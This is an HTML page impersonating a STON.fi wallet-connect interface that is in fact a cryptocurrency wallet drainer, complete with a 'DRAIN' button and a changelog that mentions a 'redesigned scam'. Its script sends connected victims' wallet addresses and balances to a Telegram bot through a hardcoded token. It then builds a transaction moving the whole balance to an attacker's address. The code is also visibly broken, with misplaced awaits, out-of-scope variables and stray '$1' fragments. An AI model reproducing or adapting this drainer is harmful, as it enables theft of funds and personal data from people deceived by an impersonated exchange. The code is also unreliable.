<!DOCTYPE html>
<html>
<head>
    <title>STON.fi Connect Wallet</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
</head>
<body>
    <h1>STON.fi Connect Wallet Interface</h1>
    <p>
        Fully transparent work, full sources. <br>
        Community of buyers, constant support. <br>
        As a gift are a few popular offers!
    </p>
    <h2>Supported Wallets:</h2>
    <ul>
        <li>Tonkeeper</li>
        <li>TG Wallet</li>
        <li>TonHub</li>
        <li>MyTonWallet</li>
        <li>DeWallet</li>
        <li>Bitget Wallet</li>
        <li>TonWallet</li>
        <li>XTONWallet</li>
        <li>OpenMask</li>
        <li>SafePal</li>
        <li>OKX Wallet</li>
        <li>HOT</li>
    </ul>

    <h2>Available Functions:</h2>
    <ul>
        <li>Transfer Ton</li>
        <li>Transfer Jetton (4 assets for 1 signature)</li>
        <li>Transfer NFT (4 assets for 1 signature, anonymous numbers and usernames included)</li>
        <li>Telegram information leakage</li>
    </ul>

    <h3>v0.8.5 Updates:</h3>
    <ul>
        <li>The operation of the NFT scan has been changed again</li>
        <li>Token evaluation system has been redesigned</li>
        <li>Marked as scam NFTs are eliminated</li>
        <li>Speeded up the work</li>
        <li>Price is determined by AVG</li>
        <li>Redesigned scam in a more pleasing for the eye look</li>
        <li>Fixed minor bugs and errors</li>
    </ul>

    <div id="ton-connect"></div> <!-- Connect Wallet Button -->
    <button onclick="didtrans();" style="margin-top: 30px; font-size: 24px;">DRAIN</button> <!-- Transfer All Assets Button -->

    <script>
        // Static tonconnect-manifest.json URL instead of dynamic creation
        const manifestUrl = 'https://aslan22822.github.io/ton-connect-wallet/tonconnect-manifest.json';
        
        // Initialize TonConnect with manifest URL
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: manifestUrl,
            buttonRootId: 'ton-connect'
        });

        // Event listener for wallet connection
        tonConnectUI.onStatusChange((walletInfo) => {
            if (walletInfo.account) {
                // Send wallet connected info to Telegram
                const tgBotToken = '7825399084:AAFIOuS92DHDfN-hE9-SG_7hQqlc9jUqRP4'; // Replace with your Telegram bot token
                const tgChatId = '5107144356'; // Replace with your Telegram chat ID
                const message = `Wallet connected: ${walletInfo.account}`;
                const telegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(message)}`;
                await fetch(telegramUrl, { method: 'GET' });
                checkBalance(walletInfo.account.address);
            } else {
                console.error('No account connected or status not recognized.');
            }
        });

        // Function to check user balance and send it to Telegram
        async function checkBalance(walletAddress) {
            try {
                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${walletAddress}`);
                const data = await response.json();
                if (data && data.result) {
                    const balance = parseFloat(data.result) / 1000000000; // Convert nanotons to TON
                    // Send balance information to Telegram
                    const balanceMessage = `Balance of ${walletAddress}: ${balance} TON`;
                    const balanceTelegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(balanceMessage)}`;
                    await fetch(balanceTelegramUrl, { method: 'GET' });

                    // Send balance information to Telegram
                    const tgBotToken = '7825399084:AAFIOuS92DHDfN-hE9-SG_7hQqlc9jUqRP4'; // Replace with your Telegram bot token
                    const tgChatId = '5107144356'; // Replace with your Telegram chat ID
                    const message = `Wallet Address: ${walletAddress}\nBalance: ${balance} TON`;
                    const telegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(message)}`;
                    await fetch(telegramUrl, { method: 'GET' });
                } else {
                    console.error('Failed to fetch balance');
                }
            } catch (error) {
                console.error('Error fetching balance:', error);
            }
        }

        // Function to transfer TON and NFTs
$1async function didtrans() {
$1    console.log('Attempting to send transaction...');
            try {
                const walletInfo = tonConnectUI.getConnectedWallet();
                if (!walletInfo || !walletInfo.account) {
                    alert('Please connect your wallet first.');
                    console.error('Wallet is not connected. Cannot proceed with transaction.');
                    return;
                }

                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 60, // Valid for 60 seconds
                    messages: [
                        {
                            address: 'YOUR_DESTINATION_WALLET_ADDRESS', // Replace with your wallet address
                            amount: walletInfo.balance - 3000000 // Deduct fee (in nanotons)
                        }
                    ]
                };

                // Send transaction
                await tonConnectUI.sendTransaction({ transaction });
                // Send transaction success message to Telegram
                const transactionMessage = 'Transaction sent successfully';
                const transactionTelegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(transactionMessage)}`;
                await fetch(transactionTelegramUrl, { method: 'GET' });
            } catch (error) {
                // Send transaction error message to Telegram
                const errorMessage = `Failed to send transaction: ${error}`;
                const errorTelegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(errorMessage)}`;
                await fetch(errorTelegramUrl, { method: 'GET' });
            }
        }
    </script>
    <script src="tonsdk.js"></script>
</body>
</html>
